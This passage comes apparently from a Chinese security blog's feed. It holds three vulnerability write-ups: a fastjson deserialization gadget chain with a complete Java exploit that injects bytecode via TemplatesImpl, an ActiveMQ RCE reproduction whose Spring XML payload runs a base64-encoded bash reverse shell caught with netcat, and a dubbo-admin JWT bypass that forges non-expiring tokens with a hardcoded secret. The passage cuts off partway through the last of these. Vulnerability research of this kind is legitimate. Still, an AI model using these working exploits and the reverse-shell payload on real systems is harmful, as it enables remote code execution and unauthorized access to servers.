<span class="hljs-title class_">Message</span>();<br>        message.setCode(<span class="hljs-number">114514</span>);<br>        message.setDetail(<span class="hljs-string">&quot;thai want to test jackson&quot;</span>);<br><br><span class="hljs-comment">//        ObjectMapper objectMapper = new ObjectMapper();</span><br><span class="hljs-comment">//        String s = objectMapper.writeValueAsString(message);</span><br><br>        com.alibaba.fastjson.JSONArray.toJSON(message);<br><br><br><span class="hljs-comment">//        System.out.println(&quot;jackon string: &quot; + s);</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240113213730812.png" alt="image-20240113213730812"></p><p>在序列化，会调用javaBean的所有getter方法。</p><h3 id="0x02-fastjson剑招瞎分析"><a href="#0x02-fastjson剑招瞎分析" class="headerlink" title="0x02 fastjson剑招瞎分析"></a>0x02 fastjson剑招瞎分析</h3><h4 id="jsonobject-jsonarray分析"><a href="#jsonobject-jsonarray分析" class="headerlink" title="jsonobject,jsonarray分析"></a>jsonobject,jsonarray分析</h4><p><img src="image-20240113213919079.png" alt="image-20240113213919079"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">getData:<span class="hljs-number">40</span>, jacksonTest$Message (com.jsonser)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>get:<span class="hljs-number">544</span>, FieldInfo (com.alibaba.fastjson.util)<br>getPropertyValue:<span class="hljs-number">153</span>, FieldSerializer (com.alibaba.fastjson.serializer)<br>getFieldValuesMap:<span class="hljs-number">797</span>, JavaBeanSerializer (com.alibaba.fastjson.serializer)<br>toJSON:<span class="hljs-number">1106</span>, JSON (com.alibaba.fastjson)<br>toJSON:<span class="hljs-number">1012</span>, JSON (com.alibaba.fastjson)<br>main:<span class="hljs-number">64</span>, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;JSON.java#toJSON()</p><p><img src="image-20240113214817756.png" alt="image-20240113214817756"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;JavaBeanSerializer.java#getFieldValuesMap()</p><p><img src="image-20240113214317673.png" alt="image-20240113214317673"></p><p><img src="image-20240113215040174.png" alt="image-20240113215040174"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;FieldSerializer.java#getPropertyValue</p><p><img src="image-20240113215230955.png" alt="image-20240113215230955"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;util&#x2F;FieldInfo.java#get()</p><p><img src="image-20240113215539479.png" alt="image-20240113215539479"></p><p>最后对里面的所有javabean属性值invoke。</p><h4 id="json-调用（看不懂，贴流程吧）"><a href="#json-调用（看不懂，贴流程吧）" class="headerlink" title="json 调用（看不懂，贴流程吧）"></a>json 调用（看不懂，贴流程吧）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">getData:40, jacksonTest$Message (com.jsonser)<br>write:-1, ASMSerializer_1_Message (com.alibaba.fastjson.serializer)<br>write:285, JSONSerializer (com.alibaba.fastjson.serializer)<br>toJSONString:758, JSON (com.alibaba.fastjson)<br>toJSONString:696, JSON (com.alibaba.fastjson)<br>toJSONString:661, JSON (com.alibaba.fastjson)<br>main:64, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>Json.toString()细节分析</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;JSON.java#toJSONString()</p><p><img src="image-20240114013846724.png" alt="image-20240114013846724"></p><p><img src="image-20240114013851659.png" alt="image-20240114013851659"></p><p>对out,config赋值。</p><p><img src="image-20240114013930510.png" alt="image-20240114013930510"></p><p>然后调用write处理传入的object</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;JSONSerializer.java#write()</p><p><img src="image-20240114023637460.png" alt="image-20240114023637460"></p><p><img src="image-20240114025044834.png" alt="image-20240114025044834"></p><p>进过一系列操作创建createJavaBeanSerializer</p><p><img src="image-20240114025145400.png" alt="image-20240114025145400"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;SerializeConfig.java#createJavaBeanSerializer()</p><p><img src="image-20240114025509056.png" alt="image-20240114025509056"></p><p>从class获取所有bean属性值，然后传入createJavaBeanSerializer(beanInfo)</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;SerializeConfig.java#createJavaBeanSerializer(beanInfo)</p><p><img src="image-20240114025943928.png" alt="image-20240114025943928"></p><p>然后得到bean中field，bean中的method</p><p><img src="image-20240114030745435.png" alt="image-20240114030745435"></p><p>自后调用createASMSerializer(beanInfo)</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;SerializeConfig.java#createASMSerializer(SerializeBeanInfo beanInfo)</p><p><img src="image-20240114031455047.png" alt="image-20240114031455047"></p><p>调用</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) </p><p><img src="image-20240114033041907.png" alt="image-20240114033041907"></p><p>然后获取对象getters</p><p>后面看不懂，总结就是序列化会调用对象中的所有getters。</p><h3 id="0x03-构造"><a href="#0x03-构造" class="headerlink" title="0x03 构造"></a>0x03 构造</h3><p>只要找一个可以ser的类里面触发toJSONString就可以。</p><p><img src="image-20240114034001775.png" alt="image-20240114034001775"></p><p><img src="image-20240114033937897.png" alt="image-20240114033937897"></p><p>下面两个都继承Json,没有toString方法，所以调用两个类的toString，就回触发Json的toString，进而触发toJSONString。</p><p><img src="image-20240114033713273.png" alt="image-20240114033713273"></p><p><img src="image-20240114033742693.png" alt="image-20240114033742693"></p><h3 id="0x04-exp-1"><a href="#0x04-exp-1" class="headerlink" title="0x04 exp"></a>0x04 exp</h3><p>找一个readObject触发toString方法。然后把触发对象改为JSONObject或者JSONArray就行</p><p>cc5的前半就满足这个条件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        cmd.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Command</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open .\&quot;);&quot;</span>;<br>        cmd.makeClassInitializer().insertBefore(Command);<br>        cmd.toClass();<br><span class="hljs-comment">//        CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;, cmd);</span><br><span class="hljs-comment">//        ctConstructor.setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;);</span><br><span class="hljs-comment">//        cmd.addConstructor(ctConstructor);</span><br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cmd.toBytecode()&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);<br><br><span class="hljs-comment">//        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">//        objects.add(templates);</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;1&quot;</span>,templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val,<span class="hljs-string">&quot;val&quot;</span>,jsonObject);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(templates,val);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(hashMap);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>剑招学习完毕。脑子不够用，驻场了。。。</p><h2 id="偷学剑招-佬文链接"><a href="#偷学剑招-佬文链接" class="headerlink" title="偷学剑招(佬文链接)"></a>偷学剑招(佬文链接)</h2><p><a href="https://xz.aliyun.com/t/12509">https://xz.aliyun.com/t/12509</a></p><p><a href="https://xz.aliyun.com/t/12755">https://xz.aliyun.com/t/12755</a></p><p><a href="https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/">https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</a></p><p><a href="http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/">http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/</a></p><p><a href="https://su18.org/post/ysoserial-su18-5/#objectbean">https://su18.org/post/ysoserial-su18-5/#objectbean</a></p><p><a href="https://tttang.com/archive/1701/#toc_beancomparator">https://tttang.com/archive/1701/#toc_beancomparator</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>activemq-rce</title>
    <link href="/2024/01/13/activemq-rce/"/>
    <url>/2024/01/13/activemq-rce/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-复现"><a href="#0x01-复现" class="headerlink" title="0x01 复现"></a>0x01 复现</h2><p>好久前的 ，同步一下</p><p>下载activemq安装包，在bin目录下启动</p><p>activemq console</p><p><img src="image-20231026183129912.png" alt="image-20231026183129912"></p><p>下载poc <a href="https://github.com/Fw-fW-fw/activemq_Throwable">https://github.com/Fw-fW-fw/activemq_Throwable</a></p><p>在 poc目录下起一个http服务</p><p>python3 -m http.server 8000</p><p>编写一个poc为反弹shell</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  <br>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>执行的命令写在&lt;value&gt;标签内</p><p>用nc起一个监听</p><p>nc -l 8888</p><p>最后执行poc</p><p><img src="image-20231026182415885.png" alt="image-20231026182415885"></p><p>成功shell</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dubbo-admin-authorized-bypass-CNVD-2023-96546</title>
    <link href="/2024/01/10/dubbo-admin-authorized-bypass-CNVD-2023-96546/"/>
    <url>/2024/01/10/dubbo-admin-authorized-bypass-CNVD-2023-96546/</url>
    
    <content type="html"><![CDATA[<h2 id="dubbo-admin-JWT-BYPASS"><a href="#dubbo-admin-JWT-BYPASS" class="headerlink" title="dubbo-admin_JWT_BYPASS"></a>dubbo-admin_JWT_BYPASS</h2><p>Affected versions dubbo-admin 0.4-0.6</p><h2 id="0x01-analyze"><a href="#0x01-analyze" class="headerlink" title="0x01 analyze"></a>0x01 <strong>analyze</strong></h2><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;controller&#x2F;UserController.java#login()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse response, <span class="hljs-meta">@RequestParam</span> String userName, <span class="hljs-meta">@RequestParam</span> String password)</span> &#123;<br>       ExtensionLoader&lt;LoginAuthentication&gt; extensionLoader = ExtensionLoader.getExtensionLoader(LoginAuthentication.class);<br>       Set&lt;LoginAuthentication&gt; supportedExtensionInstances = extensionLoader.getSupportedExtensionInstances();<br>       Iterator&lt;LoginAuthentication&gt; iterator = supportedExtensionInstances.iterator();<br>       <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>       <span class="hljs-keyword">if</span> (iterator != <span class="hljs-literal">null</span> &amp;&amp; !iterator.hasNext()) &#123;<br>           <span class="hljs-keyword">if</span> (StringUtils.isBlank(rootUserName) || (rootUserName.equals(userName) &amp;&amp; rootUserPassword.equals(password))) &#123;<br>               <span class="hljs-keyword">return</span> jwtTokenUtil.generateToken(userName);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               flag = <span class="hljs-literal">false</span>;<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">直接确定用户名和密码填写即可，然后获取jwtToken<br></code></pre></td></tr></table></figure><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;utils&#x2F;JwtTokenUtil.java#generateToken()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateToken</span><span class="hljs-params">(String rootUserName)</span> &#123;<br>    Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>    claims.put(<span class="hljs-string">&quot;sub&quot;</span>, rootUserName);<br>    <span class="hljs-keyword">return</span> Jwts.builder()<br>            .setClaims(claims)<br>            .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() + expiration))<br>            .setIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis()))<br>            .signWith(defaultAlgorithm, secret)<br>            .compact();<br>&#125;<br></code></pre></td></tr></table></figure><p>那么这里是jwttoken的处理方式，包括认证时间、过期时间、用户名。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;utils&#x2F;JwtTokenUtil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">* Jwt signingKey configurable<br> */<br><span class="hljs-meta">@Value(&quot;$&#123;admin.check.signSecret:&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String secret;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * token timeout configurable</span><br><span class="hljs-comment"> * default to be an hour: 1000 * 60 * 60</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Value(&quot;$&#123;admin.check.tokenTimeoutMilli:&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">long</span> expiration;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * default SignatureAlgorithm</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SignatureAlgorithm</span> <span class="hljs-variable">defaultAlgorithm</span> <span class="hljs-operator">=</span> SignatureAlgorithm.HS512;<br></code></pre></td></tr></table></figure><p>该类定义了固定的秘密、过期、默认算法。 现在我们知道了加密方式，我们就可以使用假jwt来登录绕过了。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;authentication&#x2F;impl&#x2F;DefaultPreHandle.java#authentication()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">authentication</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;<br>        <span class="hljs-type">HandlerMethod</span> <span class="hljs-variable">handlerMethod</span> <span class="hljs-operator">=</span> (HandlerMethod) handler;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> handlerMethod.getMethod();<br>        <span class="hljs-type">Authority</span> <span class="hljs-variable">authority</span> <span class="hljs-operator">=</span> method.getDeclaredAnnotation(Authority.class);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == authority) &#123;<br>            authority = method.getDeclaringClass().getDeclaredAnnotation(Authority.class);<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;Authorization&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != authority &amp;&amp; authority.needLogin()) &#123;<br>            <span class="hljs-comment">//check if &#x27;authorization&#x27; is empty to prevent NullPointException</span><br>            <span class="hljs-keyword">if</span> (StringUtils.isEmpty(token)) &#123;<br>                <span class="hljs-comment">//While authentication is required and &#x27;Authorization&#x27; string is missing in the request headers,</span><br>                <span class="hljs-comment">//reject this request(http403).</span><br>                AuthInterceptor.authRejectedResponse(response);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (jwtTokenUtil.canTokenBeExpiration(token)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-comment">//while user not found, or token timeout, reject this request(http401).</span><br>            AuthInterceptor.loginFailResponse(response);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以分析一下，从Authorization中获取jwt，然后确定过期时间。现在我们有办法对其进行加密，就是针对一个长期不过期的jwt。</p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.dubbo.admin.controller;<br><br><span class="hljs-keyword">import</span> io.jsonwebtoken.Jwts;<br><span class="hljs-keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jwt</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateToken</span><span class="hljs-params">(String rootUserName)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">secret</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;86295dd0c4ef69a1036b0b0c15158d77&quot;</span>;<br>        <span class="hljs-type">Long</span> <span class="hljs-variable">timeStamp</span> <span class="hljs-operator">=</span> <span class="hljs-number">9999999999999L</span>;<br>        <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 